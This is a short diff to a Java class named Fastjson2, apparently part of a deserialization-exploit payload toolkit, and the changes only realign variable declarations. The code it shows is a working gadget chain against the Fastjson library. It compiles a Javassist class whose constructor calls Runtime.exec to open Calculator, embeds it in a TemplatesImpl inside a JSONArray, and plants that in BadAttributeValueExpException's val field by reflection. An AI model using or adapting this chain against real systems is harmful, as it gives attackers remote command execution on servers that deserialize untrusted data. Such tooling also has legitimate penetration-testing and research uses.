@@ -15,9 +15,9 @@ import java.util.HashMap;
 public class Fastjson2 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
-        ClassPool pool       = ClassPool.getDefault();
-        CtClass   clazz      = pool.makeClass("a");
-        CtClass   superClass = pool.get(AbstractTranslet.class.getName());
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
         clazz.setSuperclass(superClass);
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
         constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
@@ -28,8 +28,8 @@ public class Fastjson2 implements ObjectPayload<Object> {
         JSONArray jsonArray = new JSONArray();
         jsonArray.add(templates);
 
-        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
-        Field                         valfield = val.getClass().getDeclaredField("val");
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
         valfield.setAccessible(true);
         valfield.set(val, jsonArray);
 
